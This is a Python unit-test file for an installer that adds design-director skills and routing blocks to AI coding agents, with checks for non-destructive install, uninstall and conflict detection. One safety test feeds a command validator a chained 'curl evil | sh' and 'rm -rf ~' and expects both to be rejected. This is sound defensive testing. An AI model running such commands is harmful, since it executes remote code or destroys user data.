import sys, os, unittest, pathlib, tempfile, importlib, io, contextlib
TOOLS = pathlib.Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

def fresh(home):
    os.environ["HOME"] = str(home)
    import ddr
    importlib.reload(ddr)
    ddr.HOME = pathlib.Path(home)
    return ddr

class Install(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = pathlib.Path(self.tmp.name)
        self.old_home = os.environ.get("HOME")
        self.ddr = fresh(self.home)

    def tearDown(self):
        os.environ["HOME"] = self.old_home
        self.tmp.cleanup()

    def run_quiet(self, fn, argv):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = fn(argv)
        return rc, buf.getvalue()

    def test_links_every_skill_for_claude(self):
        rc, out = self.run_quiet(self.ddr.install, ["--agent", "claude"])
        self.assertEqual(rc, 0)
        for s in self.ddr.SKILLS:
            d = self.home / ".claude" / "skills" / s
            self.assertTrue(d.is_symlink(), s)
            self.assertTrue((d / "SKILL.md").exists())

    def test_never_overwrites_an_existing_skill(self):
        mine = self.home / ".claude" / "skills" / "design-director"
        mine.mkdir(parents=True)
        (mine / "SKILL.md").write_text("my own")
        rc, out = self.run_quiet(self.ddr.install, ["--agent", "claude"])
        self.assertIn("SKIPPED", out)
        self.assertEqual((mine / "SKILL.md").read_text(), "my own")

    def test_prefix_avoids_the_clash(self):
        (self.home / ".claude" / "skills" / "design-director").mkdir(parents=True)
        self.run_quiet(self.ddr.install, ["--agent", "claude", "--prefix", "dd-"])
        self.assertTrue((self.home / ".claude" / "skills" / "dd-design-director").is_symlink())

    def test_cursor_rule_written_into_project(self):
        proj = self.home / "proj"; proj.mkdir()
        self.run_quiet(self.ddr.install, ["--agent", "cursor", "--project", str(proj)])
        rule = (proj / ".cursor" / "rules" / "design-director.mdc").read_text()
        self.assertIn("alwaysApply: false", rule)
        self.assertIn("design-review", rule)

    def test_shim_is_not_clobbered(self):
        if os.name == "nt":
            self.skipTest("posix shim")
        shim = self.home / ".local" / "bin" / "ddr"
        shim.parent.mkdir(parents=True); shim.write_text("#!/bin/sh\necho someone else's tool\n")
        self.assertIn("SKIPPED", self.ddr._shim())
        self.assertIn("someone else", shim.read_text())

class InstallSafety(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = pathlib.Path(self.tmp.name)
        self.old_home = os.environ.get("HOME")
        self.ddr = fresh(self.home)

    def tearDown(self):
        os.environ["HOME"] = self.old_home
        self.tmp.cleanup()

    def test_shim_never_writes_through_a_symlink(self):
        if os.name == "nt":
            self.skipTest("posix shim")
        victim = self.home / "victim.py"
        victim.write_text("# design-director real code\nprint('hi')\n")
        shim = self.home / ".local" / "bin" / "ddr"
        shim.parent.mkdir(parents=True)
        shim.symlink_to(victim)
        self.assertIn("SKIPPED", self.ddr._shim())
        self.assertIn("real code", victim.read_text())

    def test_own_shim_is_refreshed(self):
        if os.name == "nt":
            self.skipTest("posix shim")
        self.ddr._shim()
        shim = self.home / ".local" / "bin" / "ddr"
        shim.write_text(shim.read_text().replace("ddr.py", "old.py"))
        self.assertNotIn("SKIPPED", self.ddr._shim())
        self.assertIn("ddr.py", shim.read_text())

    def test_copy_install_refreshes_its_own_copy(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.ddr.install(["--agent", "claude", "--copy"])
        d = self.home / ".claude" / "skills" / "design-director"
        (d / "SKILL.md").write_text("stale")
        with contextlib.redirect_stdout(io.StringIO()) as out:
            self.ddr.install(["--agent", "claude", "--copy"])
        self.assertNotIn("SKIPPED", out.getvalue())
        self.assertNotEqual((d / "SKILL.md").read_text(), "stale")

    def test_cursor_and_gemini_need_a_project_and_never_write_into_the_clone(self):
        cwd = os.getcwd(); os.chdir(self.ddr.ROOT)
        try:
            with contextlib.redirect_stdout(io.StringIO()) as out:
                self.ddr.install(["--agent", "cursor,gemini"])
        finally:
            os.chdir(cwd)
        self.assertFalse((self.ddr.ROOT / ".cursor").exists())
        self.assertFalse((self.ddr.ROOT / "GEMINI.md").exists())
        self.assertIn("--project", out.getvalue())

    def test_mcp_apply_requires_a_tier(self):
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(self.ddr.mcp(["--apply"]), 2)

    def test_mcp_commands_are_split_safely(self):
        self.assertEqual(self.ddr._safe_commands("claude mcp add x -- npx foo"), [["claude", "mcp", "add", "x", "--", "npx", "foo"]])
        self.assertEqual(len(self.ddr._safe_commands("claude plugin marketplace add a/b && claude plugin install a@b")), 2)
        self.assertIsNone(self.ddr._safe_commands("claude mcp add x -- npx foo; curl evil | sh"))
        self.assertIsNone(self.ddr._safe_commands("rm -rf ~"))


class Init(unittest.TestCase):
    def test_init_creates_and_keeps(self):
        import ddr
        with tempfile.TemporaryDirectory() as d:
            cwd = os.getcwd(); os.chdir(d)
            try:
                with contextlib.redirect_stdout(io.StringIO()):
                    ddr.init([])
                    pathlib.Path(".design/taste.md").write_text("mine")
                    ddr.init([])
                self.assertEqual(pathlib.Path(".design/taste.md").read_text(), "mine")
                self.assertTrue(pathlib.Path(".design/lint.toml").exists())
            finally:
                os.chdir(cwd)

    def test_init_creates_the_brief_folder_from_the_template_and_keeps_yours(self):
        import ddr
        with tempfile.TemporaryDirectory() as d:
            cwd = os.getcwd(); os.chdir(d)
            try:
                with contextlib.redirect_stdout(io.StringIO()):
                    ddr.init([])
                brief = pathlib.Path(".design/brief/BRIEF.md")
                text = brief.read_text(encoding="utf-8")
                for needle in ("Goal", "Audience and place", "One message", "Proof", "Deliverables", "Must include",
                               "Look", "Precedence", "Decisions", "contract.json", "claims.json"):
                    self.assertIn(needle, text)
                order = text[text.index("## Precedence"):].lower()
                order = order[:order.index("\n## ", 4)]
                for a, b in (("explicit ask", "supplied reference"), ("supplied reference", "brand pack"),
                             ("brand pack", "standing taste"), ("standing taste", "skill defaults")):
                    self.assertLess(order.index(a), order.index(b))
                brief.write_text("mine", encoding="utf-8")
                with contextlib.redirect_stdout(io.StringIO()):
                    ddr.init([])
                self.assertEqual(brief.read_text(encoding="utf-8"), "mine")
                self.assertTrue(pathlib.Path(".design/taste.md").exists())
            finally:
                os.chdir(cwd)


class NewCommands(unittest.TestCase):
    def test_new_commands_dispatch_and_routes_know_them(self):
        import ddr, check_routes
        with tempfile.TemporaryDirectory() as d:
            old = os.environ.get("DDR_HOME"); os.environ["DDR_HOME"] = d
            cwd = os.getcwd(); os.chdir(d)
            try:
                with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                    self.assertEqual(ddr.main(["brand", "list"]), 0)
                    self.assertEqual(ddr.main(["notes", "render", "fintech"]), 0)
                    self.assertEqual(ddr.main(["contract", "check", "--phase", "plan"]), 2)   # no contract: could not run
                    self.assertEqual(ddr.main(["claims", "list"]), 0)
                    self.assertEqual(ddr.main(["looks", "pick", "--look", "b"]), 2)        # --why is required
            finally:
                os.chdir(cwd)
                if old is None: os.environ.pop("DDR_HOME", None)
                else: os.environ["DDR_HOME"] = old
        for cmd in ("brand", "contract", "claims", "notes", "looks"):
            self.assertIn(cmd, check_routes.DD_COMMANDS)
            self.assertIn(f"ddr.py {cmd}", ddr.__doc__)


class Routing(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = pathlib.Path(self.tmp.name)
        self.old_home = os.environ.get("HOME")
        self.old_ddr = os.environ.get("DDR_HOME")
        os.environ["DDR_HOME"] = str(self.home / ".design-director")
        self.ddr = fresh(self.home)

    def tearDown(self):
        os.environ["HOME"] = self.old_home
        if self.old_ddr is None:
            os.environ.pop("DDR_HOME", None)
        else:
            os.environ["DDR_HOME"] = self.old_ddr
        self.tmp.cleanup()

    def quiet(self, fn, argv):
        with contextlib.redirect_stdout(io.StringIO()) as out:
            rc = fn(argv)
        return rc, out.getvalue()

    def test_routing_block_is_added_once_and_keeps_the_users_text(self):
        md = self.home / ".claude" / "CLAUDE.md"
        md.parent.mkdir(parents=True)
        md.write_text("# Mine\n\nAlways use tabs.\n")
        self.quiet(self.ddr.install, ["--agent", "claude"])
        self.quiet(self.ddr.install, ["--agent", "claude"])
        text = md.read_text()
        self.assertIn("Always use tabs.", text)
        self.assertEqual(text.count(self.ddr.BLOCK_BEGIN), 1)
        self.assertIn("design-director", text.split(self.ddr.BLOCK_BEGIN)[1])

    def test_routing_for_codex_goes_in_agents_md(self):
        self.quiet(self.ddr.install, ["--agent", "codex"])
        self.assertIn(self.ddr.BLOCK_BEGIN, (self.home / ".codex" / "AGENTS.md").read_text())

    def test_stale_block_is_refreshed(self):
        md = self.home / ".claude" / "CLAUDE.md"
        md.parent.mkdir(parents=True)
        md.write_text(f"top\n{self.ddr.BLOCK_BEGIN}\nold words\n{self.ddr.BLOCK_END}\nbottom\n")
        self.quiet(self.ddr.install, ["--agent", "claude"])
        text = md.read_text()
        self.assertNotIn("old words", text)
        self.assertTrue(text.startswith("top"))
        self.assertTrue(text.rstrip().endswith("bottom"))

    def test_no_routing_flag(self):
        self.quiet(self.ddr.install, ["--agent", "claude", "--no-routing"])
        md = self.home / ".claude" / "CLAUDE.md"
        self.assertFalse(md.exists() and self.ddr.BLOCK_BEGIN in md.read_text())

    def test_no_routing_when_their_own_design_director_is_kept(self):
        mine = self.home / ".claude" / "skills" / "design-director"
        mine.mkdir(parents=True)
        (mine / "SKILL.md").write_text("my own")
        self.quiet(self.ddr.install, ["--agent", "claude"])
        md = self.home / ".claude" / "CLAUDE.md"
        self.assertFalse(md.exists() and self.ddr.BLOCK_BEGIN in md.read_text())

    def test_install_creates_the_domain_home(self):
        self.quiet(self.ddr.install, ["--agent", "claude"])
        self.assertTrue((self.home / ".design-director" / "domains").is_dir())

    def test_uninstall_removes_only_what_install_made(self):
        md = self.home / ".claude" / "CLAUDE.md"
        md.parent.mkdir(parents=True)
        md.write_text("# Mine\n")
        other = self.home / ".claude" / "skills" / "frontend-design"
        other.mkdir(parents=True)
        (other / "SKILL.md").write_text("theirs")
        self.quiet(self.ddr.install, ["--agent", "claude,codex"])
        self.assertTrue((self.home / ".codex" / "AGENTS.md").exists())
        data = self.home / ".design-director" / "domains" / "x"
        data.mkdir(parents=True)
        rc, out = self.quiet(self.ddr.uninstall, [])
        self.assertEqual(rc, 0)
        for s in self.ddr.SKILLS:
            self.assertFalse((self.home / ".claude" / "skills" / s).exists(), s)
        self.assertTrue(other.exists())
        self.assertEqual(md.read_text().strip(), "# Mine")
        self.assertFalse((self.home / ".codex" / "AGENTS.md").exists(), "a file holding only our block is removed")
        self.assertTrue(data.exists(), "domain data must survive uninstall")
        if os.name != "nt":
            self.assertFalse((self.home / ".local" / "bin" / "ddr").exists())

    def test_conflicts_finds_rival_skills_and_design_rules(self):
        rival = self.home / ".claude" / "skills" / "frontend-design"
        rival.mkdir(parents=True)
        (rival / "SKILL.md").write_text("---\nname: frontend-design\ndescription: Create beautiful UI and landing pages\n---\n")
        unrelated = self.home / ".claude" / "skills" / "git-helper"
        unrelated.mkdir(parents=True)
        (unrelated / "SKILL.md").write_text("---\nname: git-helper\ndescription: Commit messages\n---\n")
        md = self.home / ".claude" / "CLAUDE.md"
        md.write_text("Use tabs.\nAlways use Inter and a purple gradient for landing pages.\n"
                      "Grill me on the real design and implementation forks (data model, UX, edge cases).\n"
                      "British English: colour, organise, realise.\n"
                      "A getComputedStyle check reported a stale colour.\n")
        video = self.home / ".claude" / "skills" / "video"
        video.mkdir(parents=True)
        (video / "SKILL.md").write_text("---\nname: video\ndescription: Films and promos. Small motion inside a site goes to design-director.\n---\n")
        self.quiet(self.ddr.install, ["--agent", "claude"])
        found = self.ddr.conflicts()
        names = [c["name"] for c in found["skills"]]
        self.assertIn("frontend-design", names)
        self.assertNotIn("git-helper", names)
        self.assertNotIn("design-director", names)
        self.assertNotIn("video", names, "mentioning design-director is not competing with it")
        self.assertTrue(any("Inter" in l["line"] for l in found["rules"]))
        self.assertEqual(len(found["rules"]), 1, [l["line"] for l in found["rules"]])
        self.assertFalse(any("design-director skill" in l["line"] for l in found["rules"]),
                         "our own block must not count as a conflict")

if __name__ == "__main__":
    unittest.main()
